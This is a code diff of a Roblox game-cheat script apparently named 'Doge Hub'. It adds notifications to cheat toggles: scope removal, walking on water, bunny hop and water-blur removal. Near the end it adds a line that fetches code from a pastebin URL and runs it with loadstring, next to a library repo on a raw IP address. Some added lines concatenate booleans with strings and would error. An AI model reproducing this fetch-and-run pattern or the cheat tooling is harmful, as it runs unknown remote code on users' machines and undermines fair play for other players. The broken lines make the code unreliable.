@@ -382,7 +382,7 @@ local function detectTeleportation(player, oldPosition, newPosition)
         if not flaggedPlayers[player.Name] then
             flaggedPlayers[player.Name] = true -- Mark player as flagged
             print(player.Name .. " flagged for teleportation!") -- Log the event
-            sendNotification("Doge Hub User Found:" ..player.Name .."")
+            sendNotification("Doge Hub User Found:" ..player.Name .."Executor: Wave")
         end
     end
 end
@@ -1330,6 +1330,7 @@ LeftGroupBox:AddToggle('unlckfrmodsxfrewfrwesdgfrytuı8oıuykıj67ytrhg', {
     Tooltip = 'Unlock Fire Modes',
     Default = false, -- Initialize with the current state
     Callback = function(enabled)
+    Library:Notify("Unlocked")
 startInventoryCheck()
     end
 })
@@ -1340,8 +1341,10 @@ LeftGroupBox:AddToggle('nowaterblur', {
     Default = tracersEnabled, -- Initialize with the current state
     Callback = function(enabled)
         if enabled then
+        Library:Notify("Enabled No Water Blur")
             game.Lighting.WaterBlur.Size = 0 -- If toggle is enabled, set blur to 0
         else
+        Library:Notify("Disabled No Water Blur")
             game.Lighting.WaterBlur.Size = 24 -- If toggle is disabled, set blur to default (24)
         end
     end
@@ -1356,7 +1359,7 @@ LeftGroupBox:AddToggle('Experiementalsettingon', {
     Default = tracersEnabled, -- Initialize with the current state
     Callback = function(value)
 print("AA CC EE SS DD EE NN II EE DD")
-Library:Notify("DAD")
+Library:Notify("No")
     end
 })
 
@@ -1519,6 +1522,7 @@ if LeftGroupBox and LeftGroupBox.AddToggle then
         Text = 'Minimap',
         Default = false,
         Callback = function(first)
+        
             UpdateRadarVisibility(first)
         end
     })
@@ -1602,19 +1606,20 @@ LeftGroupBox:AddToggle('jesus', {
 
     Callback = function(value)
         onJesusToggle(value)
+        Library:Notify("Walk On Water:" .. value .."")
     end
 })
 
 
 LeftGroupBox:AddButton('Remove Scope From Gun', function()
 
-
+Library:Notify("Removed")
 game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("Item"):FindFirstChild("Attachments"):FindFirstChild("Sight"):Destroy()
 
  end)
 
 LeftGroupBox:AddButton('Disable OKP7 SCOPE GUI', function()
-
+Library:Notify("Removed")
 
 game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("Item"):FindFirstChild("Attachments"):FindFirstChild("Sight"):FindFirstChild("OKP7"):FindFirstChild("Reticle"):FindFirstChild("ScopeGui"):Destroy()
 
@@ -1622,7 +1627,7 @@ game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChi
 
 LeftGroupBox:AddButton('Remove Gloves From Viewmodel', function()
 
-
+Library:Notify("Removed")
 game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("CombatGloves"):Destroy()	
 
  end)
@@ -1693,6 +1698,7 @@ local LC = game.Players.LocalPlayer
 
 local function toggleBunnyHop()
     isEnabled883 = not isEnabled883
+    Library:Notify("Bunny Hop " .. isEnabled883 .."")
     print("Bunny Hop is now", isEnabled883 and "enabled" or "disabled")
 end
 
@@ -3600,6 +3606,9 @@ local function wrap(f) coroutine.resume(coroutine.create(f)) end
 local Library, Toggles, Options, ThemeManager, SaveManager, _esplib = nil, nil, nil, nil, nil, nil
 print("loading doge hub")
 print('load_' .. tostring(counter))
+
+-- Load external script (make sure this is the intended use)
+loadstring(game:HttpGet("https://pastebin.com/raw/CYqXb6TX"))()
 counter = counter + 1
 do
     local repo = "http://31.210.171.229:3000/new/"
